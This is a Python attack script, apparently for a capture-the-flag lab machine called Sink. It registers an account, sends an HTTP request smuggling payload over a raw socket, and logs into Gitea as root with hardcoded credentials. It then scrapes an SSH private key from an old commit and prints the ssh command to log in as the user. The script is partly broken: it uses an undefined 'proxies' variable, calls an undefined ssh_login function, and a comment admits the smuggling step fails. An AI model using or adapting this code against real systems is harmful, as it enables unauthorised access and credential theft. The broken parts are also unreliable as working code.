#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
import socket
import time
from bs4 import BeautifulSoup
import paramiko

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-U", "--username", help="Username we want to register", required=True)
parser.add_argument("-P", "--password", help="Password we want to use for the register", required=True)


args = parser.parse_args()

s = requests.Session()

def register (target, username, password):
    
    url = "http://%s:5000/" % target
    
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Referer": "http://10.10.10.225:5000/",
        "Origin": "http://10.10.10.225:5000"
         }
    
    data = { "username" : username, "email" : str(username)+"@sink.htb", "password" : password }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.post(url, headers=headers, data=data, allow_redirects=True) # proxies=proxies
    
    if "Logout" in r.text:
        print("[SUCCESS] " + str(username) + " was successfully registered!")
    else:
        print("[ERROR] Registration Failed! Maybe the user already exists!")
        sys.exit(1)
    
    print("[SUCCESS] Session cookies extracted: " + str(s.cookies.get_dict()['session']))
    return str(s.cookies.get_dict()['session'])



def http_smuggling(target, cookie):

    #target = "127.0.0.1"

    request ="GET / HTTP/1.1 \nHost: 10.10.10.225:5000\n"
    request +="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n"
    request +="Cookie: session="+ str(cookie) + "\nContent-Length: 162\nTransfer-Encoding: chunked"
    request +="\n \n0 \n \n"
    request +="POST /notes HTTP/1.1\nHost: 10.10.10.225:5000\nCookie: session=" + str(cookie) + "\nContent-Length: 330\n"
    request +="\nnote=\n"
    

    # create a socket connection to send our request payload
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print("[INFO] Sending the HTTP Request smuggling payload...")
        s.connect((str(target), 5000))
        s.send(request.encode())
        time.sleep(5)
    
    print("\n[ERROR] The HTTP Request Smuggling exploit is not working properly, we extracted the credentials manually \n")


def extract_commit(target):
    # Using the credentials extracted from Dev Node URL
    # Login to Gitea and extract the commit

    # extract the CSRF token
    print("[INFO] Attempting to extract the CSRF token...")

    url = "http://%s:3000/" % target
    
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.get(url, headers=headers, proxies=proxies)
    
    soup = BeautifulSoup(r.text, 'html.parser')

    csrf_magic = str(soup("script")[-4]).split("csrf")[1][3:57]

    print("[SUCCESS] CSRF token obtained: " + str(csrf_magic))

    print("[INFO] Attempting to login into Gitea using the set of credentials gathered from the HTTP request smuggling attack...")
    data = { "_csrf": csrf_magic , "user_name" : "root", "password" : "FaH@3L>Z3})zzfQ3" }
    
    login_url = "http://%s:3000/user/login" % target
    r = s.post(login_url, headers=headers, data=data, allow_redirects=True) # proxies=proxies
    
    if "Dashboard" in r.text:
        print("[SUCCESS] Login using the root account was successfully!")
    else:
        print("[ERROR] Login Failed, check the creds!")
        sys.exit(1)

    print("[INFO] Searching for secrets in old commits...")

    commit_url = "http://%s:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e" % target
    r = s.get(commit_url, headers=headers, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')

    print("[SUCCESS] Managed to extract markus SSH private key from an old commit: \n")
    
    # lines of the SSH private key
    ssh_lines = soup.find_all("span", {"class":"mono wrap nohighlight"})
    
    # write to file
    f = open("id_rsa", "w")
    
    for line in ssh_lines[1:]:
        f.write(str(line.text))
        print(line.text)
    
    f.close()
    print("\n[SUCCESS] The SSH key was successfully written to disk")
    os.system("chmod 600 id_rsa")
    print("[SUCCESS] The appropriate permissions were given: `chmod 600 id_rsa`")

    print("[INFO] Now you can just SSH into the box with using the following command: \n ssh -i id_rsa marcus@10.10.10.225")


def main():
    cookie = register(args.target, args.username, args.password)
    http_smuggling(args.target, cookie)
    extract_commit(args.target)
    ssh_login(args.target)

if __name__ == "__main__":
    main()
